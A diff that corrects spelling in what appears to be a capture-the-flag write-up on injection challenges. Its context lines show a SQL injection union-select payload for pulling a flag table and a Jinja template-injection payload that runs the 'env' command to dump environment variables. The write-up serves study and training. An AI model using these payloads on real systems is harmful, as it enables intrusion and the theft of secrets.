@@ -78,7 +78,7 @@ SELECT * FROM users WHERE username = '$INPUT'
 
 ### SQL Injection 2
 
-**Context**: Same database structure and normalization as in SQL 1, but the injection occurs in an number comparison.
+**Context**: Same database structure and normalization as in SQL 1, but the injection occurs in a number comparison.
 
 ```sql
 SELECT * FROM users WHERE age <$INPUT
@@ -143,7 +143,7 @@ print(tmpl.render())
 Hello $INPUT
 ```
 
-**Payload**: The check to validate the flag was a bit off, I discovered you could display every environment variables and it would be considered as a `SUCCESS` since the flag content was inside. The final payload was executing the `env` binary, thanks to Polidarius' research it is a very small payload: [Python vulnerabilities : Code execution in jinja templates - July 27, 2021](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/).
+**Payload**: The check to validate the flag was a bit off, I discovered you could display every environment variables and it would be considered as a `SUCCESS` since the flag content was inside. The final payload was executing the `env` binary, thanks to Podalirius' research it is a very small payload: [Python vulnerabilities : Code execution in jinja templates - July 27, 2021](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/).
 
 ```ps1
 {{ lipsum.__globals__["os"].popen('env').read() }} 
@@ -341,7 +341,7 @@ Things starts to get tricky for the SQL injections because of the quote from the
 ' union select flag,null,null from flag
 ```
 
-We can use a SQLite commment "--" to remove it when it is un-necessary: `9 union select flag,flag,0 from flag--' union select flag,null,null from flag`
+We can use a SQLite comment "--" to remove it when it is un-necessary: `9 union select flag,flag,0 from flag--' union select flag,null,null from flag`
 
 ```sql
 -- SQL1
